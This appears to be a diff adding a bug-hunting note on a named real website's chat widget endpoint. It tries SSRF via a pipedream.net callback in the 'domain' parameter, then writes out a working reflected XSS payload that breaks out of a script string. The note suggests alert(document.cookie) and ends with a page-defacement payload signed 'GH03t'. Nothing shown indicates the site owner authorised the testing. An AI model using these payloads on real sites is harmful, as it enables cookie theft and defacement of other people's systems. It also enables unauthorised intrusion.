@@ -1,0 +1,59 @@
+1. If the server response is json instead of html, we can do client-side attack.
+
+HTTP/1.1 200 OK
+Date: Thu, 18 Jan 2024 10:34:47 GMT
+Vary: Accept-Encoding
+Content-Length: 2916
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Login</title>
+        
+        <!-- Fonts -->
+        
+        <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,400,300,600&subset=latin,cyrillic,latin-ext,cyrillic-ext' rel='stylesheet' type='text/css'>
+        
+        <!-- Styles -->
+
+2. Can also change the POST method to GET method to make a request to server. Burpsuite > Repeater > R.C > Change a request method.
+
+3. If the submit button link 
+   http://www.h2ointerior.com.sg/we_chat/php/app.php?widget-iframe-content&domain=www.h2ointerior.com.sg#
+
+   domain=http://localhost (local domain)
+
+   If the domain can change into our domain, that vul is called SSRF (all the requests are come through our domain)
+    
+   www.h2ointerior.com.sg/we_chat/php/app.php?widget-iframe-content&domain=eo6taebvn7oqqv5.m.pipedream.net# 
+   (pipedream.net)
+   --There is no SSRF--
+
+4. But when I find http://www.h2ointerior.com.sg/we_chat/php/app.php?widget-iframe-content&domain=www.h2ointerior.com.sg#
+
+   www.h2ointerior.com.sg (word is reflected) > view page source > www.h2ointerior.com.sg word is found
+
+   http://www.h2ointerior.com.sg/we_chat/php/app.php?widget-iframe-content&domain=test > (I insert test)
+
+   view page source > test word is found
+   <script>
+   	mobile:false,remoteDomain:'test'};
+   </script>
+   
+   <script> is already included what we need to do is insert the alert(1). -->'};alert(1)// (// is comment)
+   
+   <script>
+   	mobile:false,remoteDomain:''};alert(1)//'}; [can do alert(document.cookie) && alert(document.domain)]
+   </script>
+   
+   Finally Reflected XSS vul is exploited.
+   
+   DOM function inserted.
+   
+   '};document.querySelector('body').innerHTML='Defaced+By+GH03t';//
+   
+  
+   
+
